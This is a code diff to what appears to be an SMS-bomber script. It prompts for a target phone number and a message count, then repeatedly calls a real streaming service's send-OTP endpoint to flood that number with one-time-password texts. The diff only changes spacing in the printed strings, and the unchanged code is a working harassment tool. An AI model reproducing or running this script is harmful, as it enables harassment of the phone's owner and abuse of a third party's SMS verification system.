@@ -18,12 +18,12 @@ print("""
 \033[1;93m🔥╰╬───✯───✯───✯───✯───✯───✯───✯───✯───✯───╬╯🔥
 """)
 
-phone=input("Enter Target Number :")
-sms=int(input("Set SMS Limit :"))
+phone=input("Enter Target Number : ")
+sms=int(input("Set SMS Limit : "))
 
 url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"
 
 for a in range(sms):
 	request.urlopen(url)
-	print(str(a+1)+"SMS Sent Successfully")
+	print(str(a+1)+" SMS Sent Successfully")
 	time.sleep(30)
